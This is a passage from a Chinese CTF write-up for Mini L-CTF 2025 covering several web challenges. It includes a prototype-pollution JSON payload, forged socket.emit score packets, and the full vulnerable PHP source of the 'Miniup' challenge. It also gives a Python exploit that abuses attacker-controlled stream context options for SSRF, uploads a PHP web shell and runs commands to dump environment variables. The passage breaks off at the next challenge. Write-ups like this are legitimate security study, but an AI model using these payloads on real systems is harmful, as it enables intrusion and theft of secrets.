---
title: Mini-L CTF 2025 WriteUp by 不知道
date: 2025-05-09 13:13:44
tags: [cry,web,re,pwn,misc]
categories: wp
typora-root-url: ./..
---

# Mini L-CTF 2025

队名：不知道

排名：2

![](/images/HhJZb2AR1ofldixqdwocJDWAnAb.png)

## Web

### Clickclick

分析源代码，发现每 100 下对 `/update-amount` 发送一个 json

```json
{"type":"set","point":{"amount": 100}}
```

但是事实上到 amount1000 就不让过了

看到源码提示如果是 null/0 会删除 amount 键

那么我们污染一下让他后面正常读取即可

exp

```python
def web3():
    payload = {"type":"set","point":{"amount":None,"__proto__": {"amount": 100000}}}
    resp = requests.post(base+"/update-amount", json=payload).text
    print(resp)
```

> 神神秘秘的黑盒

### GuessOneGuess

注意到 punishment-response 中，data.score 可以自行构造

![](/images/OKW0bgqr4oVlrNxKSLjcvsXVnze.png)

制造 +Infinity 溢出

打开控制台，人工发包

```json
const socket = io();socket.emit("punishment-response", { score: -1.7976931348623157e308} );socket.emit("punishment-response", { score: -1.7976931348623157e308} );
```

然后就是一通猜，猜到就领 flag（结果可在 f12-network 里面刚刚构建的 ws 连接看到）

```json
socket.emit('guess', { value: 50 });
```

### Miniup

先图片填 `index.php` 读源码

```php
<?php
$dufs_host = '127.0.0.1';
$dufs_port = '5000';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'upload') {
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        
        $filename = $file['name'];

        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
        
        $file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        
        if (!in_array($file_extension, $allowed_extensions)) {
            echo json_encode(['success' => false, 'message' => '只允许上传图片文件']);
            exit;
        }
        
        $target_url = 'http://' . $dufs_host . ':' . $dufs_port . '/' . rawurlencode($filename);
        
        $file_content = file_get_contents($file['tmp_name']);
        
        $ch = curl_init($target_url);
        
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $file_content);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: ' . $dufs_host . ':' . $dufs_port,
            'Origin: http://' . $dufs_host . ':' . $dufs_port,
            'Referer: http://' . $dufs_host . ':' . $dufs_port . '/',
            'Accept-Encoding: gzip, deflate',
            'Accept: */*',
            'Accept-Language: en,zh-CN;q=0.9,zh;q=0.8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Content-Length: ' . strlen($file_content)
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        curl_close($ch);
        
        if ($http_code >= 200 && $http_code < 300) {
            echo json_encode(['success' => true, 'message' => '图片上传成功']);
        } else {
            echo json_encode(['success' => false, 'message' => '图片上传失败，请稍后再试']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '未选择图片']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'search') {
    if (isset($_POST['query']) && !empty($_POST['query'])) {
        $search_query = $_POST['query'];
        
        if (!ctype_alnum($search_query)) {
            echo json_encode(['success' => false, 'message' => '只允许输入数字和字母']);
            exit;
        }
        
        $search_url = 'http://' . $dufs_host . ':' . $dufs_port . '/?q=' . urlencode($search_query) . '&json';
        
        $ch = curl_init($search_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Host: ' . $dufs_host . ':' . $dufs_port,
            'Accept: */*',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code >= 200 && $http_code < 300) {
            $response_data = json_decode($response, true);
            if (isset($response_data['paths']) && is_array($response_data['paths'])) {
                $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
                
                $filtered_paths = [];
                foreach ($response_data['paths'] as $item) {
                    $file_name = $item['name'];
                    $extension = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
                    
                    if (in_array($extension, $image_extensions) || ($item['path_type'] === 'Directory')) {
                        $filtered_paths[] = $item;
                    }
                }
                
                $response_data['paths'] = $filtered_paths;
                
                echo json_encode(['success' => true, 'result' => json_encode($response_data)]);
            } else {
                echo json_encode(['success' => true, 'result' => $response]);
            }
        } else {
            echo json_encode(['success' => false, 'message' => '搜索失败，请稍后再试']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '请输入搜索关键词']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'view') {
    if (isset($_POST['filename']) && !empty($_POST['filename'])) {
        $filename = $_POST['filename'];
        
        $file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));
        
        if ($file_content !== false) {
            $base64_image = base64_encode($file_content);
            $mime_type = 'image/jpeg';
            
            echo json_encode([
                'success' => true, 
                'is_image' => true,
                'base64_data' => 'data:' . $mime_type . ';base64,' . $base64_image
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => '无法获取图片']);
        }
        
        exit;
    } else {
        echo json_encode(['success' => false, 'message' => '请输入图片路径']);
        exit;
    }
}
?>
```

注意到这行代码

```php
$file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));
```

`file_get_contents` 的参数可由 `$_POST['options']` 控制，打 ssrf 攻击 dufs 进行上传 webshell 即可，最后 rce 读 env

```python
def web2():
    payload = "<?php system($_GET['cmd']); ?>"
    resp = requests.post(base+"/index.php", data={
        "action": "view",
        "filename": "http://127.0.0.1:5000/shell.php",
        "options[http][method]": "PUT",
        "options[http][content]": payload,
        "options[http][header]": "Host: 127.0.0.1:5000\nContent-Length: {}\n".format(len(payload)),
    }).json()
    print(resp)
    resp = requests.get(base+"/shell.php?cmd=env").text
    print(resp)
```

### PyBox

很有意思一道题

先看看这题干了什么